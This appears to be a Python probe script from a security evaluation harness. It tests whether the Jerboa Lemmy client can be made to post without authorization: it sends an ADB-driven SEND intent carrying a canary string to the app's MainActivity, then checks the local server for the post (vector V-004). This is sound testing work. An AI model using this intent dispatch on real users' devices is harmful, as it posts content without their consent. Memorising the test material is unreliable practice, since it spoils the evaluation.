#!/usr/bin/env python3
"""
Probe: Jerboa — integrity (remote_attacker).
Isolated entry point for consolidated evaluation engine.
"""

from __future__ import annotations

import json
import os
import shlex
import sys
import uuid
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_alice_jwt_from_seeded_credentials,
        get_jerboa_package,
        run_adb_shell,
    )
    from probe_common import (
        BaselineError,
        SecurityInvariantViolation,
        assert_install_baseline,
        assert_lemmy_user_baseline,
        assert_runtime_baseline,
        assert_seed_corpus_visible,
        ensure_requests_ca_bundle,
        load_baseline_manifest,
        wait_for_post_body,
    )

    impact, summary = False, {"score": 1, "vectors": {}, "status": "ok"}
    try:
        ensure_requests_ca_bundle()
        assert_runtime_baseline()
        assert_install_baseline()
        assert_lemmy_user_baseline()

        alice_jwt = get_alice_jwt_from_seeded_credentials()
        if not alice_jwt:
            raise BaselineError("missing Alice JWT")

        manifest = load_baseline_manifest()
        if not manifest:
            raise BaselineError("missing baseline manifest")

        try:
            assert_seed_corpus_visible(
                base_url=os.getenv("LEMMY_URL", "https://localhost:8536"),
                alice_jwt=alice_jwt,
                manifest=manifest,
            )
        except Exception as exc:
            raise BaselineError(f"seed corpus check failed: {exc}")

        canary_body = f"mcb-post-{uuid.uuid4().hex}"
        package_name = get_jerboa_package()

        # V-004: Unauthorized posting via ADB-driven intent dispatch
        helper_ok, helper_out = run_adb_shell(
            f"am start -n {package_name}/.MainActivity "
            f"-a android.intent.action.SEND --es android.intent.extra.TEXT {shlex.quote(canary_body)} "
            "--type text/plain",
            timeout=60,
        )
        if not helper_ok:
            raise BaselineError(f"dispatch_send reproduction failed: {helper_out}")
        base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
        if wait_for_post_body(
            base_url=base_url,
            alice_jwt=alice_jwt,
            body=canary_body,
        ):
            impact = summary["vectors"]["V-004"] = True
    except SecurityInvariantViolation as exc:
        print(
            json.dumps(
                {**summary, "score": 0, "status": "compromised", "invariant": str(exc)}
            )
        )
        return 0
    except BaselineError as exc:
        print(json.dumps({**summary, "score": 0, "status": "error", "error": str(exc)}))
        return 2
    except Exception as exc:
        print(json.dumps({**summary, "score": 0, "status": "error", "error": str(exc)}))
        return 2

    summary["score"] = 0 if impact else 1
    print(json.dumps(summary))
    return 0 if impact else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
